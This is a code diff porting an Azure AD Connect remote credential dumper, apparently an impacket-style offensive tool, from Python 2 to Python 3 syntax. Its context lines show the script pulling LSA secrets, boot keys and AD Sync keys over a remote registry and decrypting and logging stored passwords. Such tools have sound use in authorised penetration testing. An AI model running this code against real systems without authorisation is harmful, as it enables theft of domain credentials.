@@ -236,7 +236,7 @@ class ADSRemoteOperations(RemoteOperations):
                 ltype, data = line.strip().split(': ')
             except ValueError:
                 continue
-            ltype = ltype.replace(u'\ufeff',u'')
+            ltype = ltype.replace('\ufeff','')
             if ltype.lower() == 'record':
                 xmldata, crypteddata = data.split(';')
                 out['cryptedrecords'].append(crypteddata)
@@ -331,7 +331,7 @@ class ADSync(OfflineRegistry):
 
     def process(self, remoteops, key, entropy):
         cryptkeys = []
-        for index, item in self.__itemsFound.items():
+        for index, item in list(self.__itemsFound.items()):
             remoteops.decryptDpapiBlobSystemkey(item, key, entropy)
         return cryptkeys
 
@@ -418,7 +418,7 @@ class DumpSecrets:
             try:
                 try:
                     self.connect()
-                except Exception, e:
+                except Exception as e:
                     if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                         # SMBConnection failed. That might be because there was no way to log into the
                         # target system. We just have a last resort. Hope we have tickets cached and that they
@@ -437,7 +437,7 @@ class DumpSecrets:
                 logging.info('Querying LSA secrets from remote registry')
                 self.__remoteOps.enableRegistry()
                 bootKey = self.__remoteOps.getBootKey()
-            except Exception, e:
+            except Exception as e:
                 self.__canProcessSAMLSA = False
                 if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                     and self.__doKerberos is True:
@@ -458,7 +458,7 @@ class DumpSecrets:
                 self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                isRemote=self.__isRemote, history=False, perSecretCallback = self.getDPAPI_SYSTEM)
                 self.__LSASecrets.dumpSecrets()
-            except Exception, e:
+            except Exception as e:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
                     traceback.print_exc()
@@ -494,7 +494,7 @@ class DumpSecrets:
                     logging.info('Extracting AD Sync encryption keys from registry')
                     self.__AdSync = ADSync(ADSYNCFileName, isRemote=self.__isRemote)
                     self.__AdSync.dump()
-                except Exception, e:
+                except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
                         traceback.print_exc()
@@ -502,7 +502,7 @@ class DumpSecrets:
 
                 try:
                     cryptkeys = self.__AdSync.process(self.__remoteOps, self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))
-                except Exception, e:
+                except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
                         traceback.print_exc()
@@ -548,14 +548,14 @@ class DumpSecrets:
                         logging.info('\tPassword: %s', fpw)
 
 
-            except Exception, e:
+            except Exception as e:
                 #if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
                 logging.error('Recprd decryption failed: %s', str(e))
 
 
-        except (Exception, KeyboardInterrupt), e:
+        except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
@@ -586,7 +586,7 @@ if __name__ == '__main__':
         # Output is redirected to a file
         sys.stdout = codecs.getwriter('utf8')(sys.stdout)
 
-    print 'Azure AD Connect remote credential dumper - by @_dirkjan'
+    print('Azure AD Connect remote credential dumper - by @_dirkjan')
 
     parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                       "the remote machine without executing any agent there.")
@@ -654,7 +654,7 @@ if __name__ == '__main__':
     dumper = DumpSecrets(remoteName, username, password, domain, options)
     try:
         dumper.dump()
-    except Exception, e:
+    except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
